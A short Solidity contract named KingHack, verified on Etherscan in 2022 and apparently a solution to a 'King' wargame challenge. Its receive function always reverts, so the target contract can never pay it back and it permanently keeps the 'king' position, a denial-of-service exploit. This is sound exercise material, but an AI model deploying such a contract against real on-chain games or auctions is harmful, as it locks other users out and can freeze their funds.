/**
 *Submitted for verification at Etherscan.io on 2022-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    address public kingAddress;

    constructor(address _where) public {
        kingAddress = _where;
    }

    function becomeKing() external payable {
        payable(kingAddress).transfer(msg.value);
    }

    receive() external payable {
        revert("can't take funds, sry");
    }
}